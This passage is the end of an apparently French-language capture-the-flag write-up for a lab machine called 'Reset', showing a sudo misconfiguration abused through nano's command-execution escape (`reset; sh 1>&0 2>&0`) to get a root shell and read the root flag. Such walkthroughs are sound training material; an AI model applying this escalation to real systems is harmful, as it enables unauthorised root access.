+</span></span><span class="line"><span class="cl">  <span class="n">Usage</span> <span class="n">of</span> <span class="o">/</span><span class="p">:</span>            <span class="mf">65.2</span><span class="o">%</span> <span class="n">of</span> <span class="mf">5.22</span><span class="n">GB</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Memory</span> <span class="n">usage</span><span class="p">:</span>          <span class="mi">23</span><span class="o">%</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Swap</span> <span class="n">usage</span><span class="p">:</span>            <span class="mi">0</span><span class="o">%</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Processes</span><span class="p">:</span>             <span class="mi">234</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Users</span> <span class="n">logged</span> <span class="ow">in</span><span class="p">:</span>       <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">  <span class="n">IPv4</span> <span class="n">address</span> <span class="k">for</span> <span class="n">eth0</span><span class="p">:</span> <span class="mf">10.129</span><span class="o">.</span><span class="mf">183.12</span>
+</span></span><span class="line"><span class="cl">  <span class="n">IPv6</span> <span class="n">address</span> <span class="k">for</span> <span class="n">eth0</span><span class="p">:</span> <span class="n">dead</span><span class="p">:</span><span class="n">beef</span><span class="p">::</span><span class="mi">250</span><span class="p">:</span><span class="mi">56</span><span class="n">ff</span><span class="p">:</span><span class="n">fe94</span><span class="p">:</span><span class="mi">9</span><span class="n">cf1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Expanded</span> <span class="n">Security</span> <span class="n">Maintenance</span> <span class="k">for</span> <span class="n">Applications</span> <span class="n">is</span> <span class="ow">not</span> <span class="n">enabled</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">0</span> <span class="n">updates</span> <span class="n">can</span> <span class="n">be</span> <span class="n">applied</span> <span class="n">immediately</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Enable</span> <span class="n">ESM</span> <span class="n">Apps</span> <span class="n">to</span> <span class="n">receive</span> <span class="n">additional</span> <span class="n">future</span> <span class="n">security</span> <span class="n">updates</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">See</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">esm</span> <span class="ow">or</span> <span class="n">run</span><span class="p">:</span> <span class="n">sudo</span> <span class="n">pro</span> <span class="n">status</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">list</span> <span class="n">of</span> <span class="n">available</span> <span class="n">updates</span> <span class="n">is</span> <span class="n">more</span> <span class="n">than</span> <span class="n">a</span> <span class="n">week</span> <span class="n">old</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">To</span> <span class="n">check</span> <span class="k">for</span> <span class="n">new</span> <span class="n">updates</span> <span class="n">run</span><span class="p">:</span> <span class="n">sudo</span> <span class="n">apt</span> <span class="n">update</span>
+</span></span><span class="line"><span class="cl"><span class="n">Failed</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">changelogs</span><span class="o">.</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">meta</span><span class="o">-</span><span class="n">release</span><span class="o">-</span><span class="n">lts</span><span class="o">.</span> <span class="n">Check</span> <span class="n">your</span> <span class="n">Internet</span> <span class="n">connection</span> <span class="ow">or</span> <span class="n">proxy</span> <span class="n">settings</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Last</span> <span class="n">login</span><span class="p">:</span> <span class="n">Sat</span> <span class="n">Jul</span> <span class="mi">19</span> <span class="mi">15</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">10</span> <span class="mi">2025</span> <span class="n">from</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.61</span>
+</span></span><span class="line"><span class="cl"><span class="n">sadm</span><span class="err">@</span><span class="n">reset</span><span class="p">:</span><span class="o">~$</span> <span class="n">id</span>
+</span></span><span class="line"><span class="cl"><span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">sadm</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">sadm</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">sadm</span><span class="p">)</span></span></span></code></pre></div></div>
+<h2 id="shell-en-tant-que-root">Shell en tant que root</h2>
+<h3 id="nano">Nano</h3>
+<p>Apres exécution de la commande <code>sudo -l</code> je vois que <code>sadm</code> peux exécuter plusieurs binaires pour lire plusieurs fichiers.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">sadm</span><span class="err">@</span><span class="n">reset</span><span class="p">:</span><span class="o">~$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">sadm</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">Matching</span> <span class="n">Defaults</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">sadm</span> <span class="n">on</span> <span class="n">reset</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">env_reset</span><span class="p">,</span> <span class="n">timestamp_timeout</span><span class="o">=-</span><span class="mi">1</span><span class="p">,</span> <span class="n">mail_badpass</span><span class="p">,</span> <span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">bin</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">use_pty</span><span class="p">,</span> <span class="o">!</span><span class="n">syslog</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">User</span> <span class="n">sadm</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="n">on</span> <span class="n">reset</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">ALL</span><span class="p">)</span> <span class="n">PASSWD</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">nano</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">firewall</span><span class="o">.</span><span class="n">sh</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">ALL</span><span class="p">)</span> <span class="n">PASSWD</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">tail</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">syslog</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">ALL</span><span class="p">)</span> <span class="n">PASSWD</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">tail</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">auth</span><span class="o">.</span><span class="n">log</span></span></span></code></pre></div></div>
+<p>Sur <a href="https://gtfobins.github.io/gtfobins/nano/#sudo" target="_blank" rel="noopener noreffer ">GTFOBins</a>, je vois la méthode pour une escalade de privilèges avec <code>nano</code>. Il suffit :</p>
+<ol>
+<li>Ouvrir le fichier avec la commande <code>sudo /usr/bin/nano /etc/firewall.sh</code>.</li>
+<li>Une fois le fichier ouvert j&rsquo;entre successivement les combinaisons <code>CTRL + R</code> et <code>CRTL + X</code></li>
+<li>Un texte s&rsquo;affiche et nous demande d&rsquo;entrer une commande. Nous entrons alors la commande suivante <code>reset; sh 1&gt;&amp;0 2&gt;&amp;0</code> puis je clique sur <code>Entrer</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Reset/Reset-15.png"
+        data-srcset="/images/Reset/Reset-15.png, /images/Reset/Reset-15.png 1.5x, /images/Reset/Reset-15.png 2x"
+        data-sizes="auto"
+        alt="/images/Reset/Reset-15.png"
+        title="/images/Reset/Reset-15.png" width="617" height="172" /></li>
+</ol>
+<p>J&rsquo;obtiens alors un shell en tant que root.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># id</span>
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># cd /root/</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ls -la</span>
+</span></span><span class="line"><span class="cl">total <span class="m">56</span>
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">8</span> root root <span class="m">4096</span> Jun  <span class="m">2</span> 11:34 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">19</span> root root <span class="m">4096</span> Jun  <span class="m">4</span> 14:57 ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Dec  <span class="m">6</span>  <span class="m">2024</span> .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root <span class="m">3106</span> Oct <span class="m">15</span>  <span class="m">2021</span> .bashrc
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">2</span> root root <span class="m">4096</span> Jun  <span class="m">2</span> 09:17 .cache
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">3</span> root root <span class="m">4096</span> Dec  <span class="m">6</span>  <span class="m">2024</span> .config
+</span></span><span class="line"><span class="cl">-rw-------  <span class="m">1</span> root root   <span class="m">20</span> Jun  <span class="m">2</span> 10:54 .lesshst
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root root <span class="m">4096</span> Dec  <span class="m">6</span>  <span class="m">2024</span> .local
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">161</span> Jul  <span class="m">9</span>  <span class="m">2019</span> .profile
+</span></span><span class="line"><span class="cl">-rw-r-----  <span class="m">1</span> root root   <span class="m">33</span> Apr <span class="m">10</span> 09:44 root_279e22f8.txt
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">2</span> root root <span class="m">4096</span> Jun  <span class="m">2</span> 11:34 .scripts
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root   <span class="m">66</span> Dec  <span class="m">6</span>  <span class="m">2024</span> .selected_editor
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">3</span> root root <span class="m">4096</span> Dec  <span class="m">6</span>  <span class="m">2024</span> snap
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">2</span> root root <span class="m">4096</span> Dec  <span class="m">6</span>  <span class="m">2024</span> .ssh
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root    <span class="m">0</span> Feb  <span class="m">7</span> 08:58 .sudo_as_admin_successful
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">165</span> Jun  <span class="m">2</span> 10:52 .wget-hsts
+</span></span><span class="line"><span class="cl"><span class="c1"># cat root_279e22f8.txt</span>
+</span></span><span class="line"><span class="cl">7ad6951bcb5a2edaffd7908b013d29b0</span></span></code></pre></div></div>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-12-11</span>
+            </div><div id="page-views" class="post-info-mod">
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/reset/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/reset/" data-title="Reset" data-via="z3rodol" data-hashtags="Easy,Linux,LFI,Log poisoning"><i class="fab fa-x-twitter" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/easy/">Easy</a>,&nbsp;<a href="/tags/linux/">Linux</a>,&nbsp;<a href="/tags/lfi/">LFI</a>,&nbsp;<a href="/tags/log-poisoning/">Log Poisoning</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/retro/" class="prev" rel="prev" title="Retro"><i class="fas fa-angle-left" aria-hidden="true"></i>Retro</a>
+            <a href="/querier/" class="next" rel="next" title="Querier">Querier<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.158.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2025 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://z3rodol.github.io" target="_blank">z3rodol</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/contrib/auto-render.min.js"></script><script src="/lib/katex/contrib/copy-tex.min.js"></script><script src="/lib/katex/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":15,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
+</html>
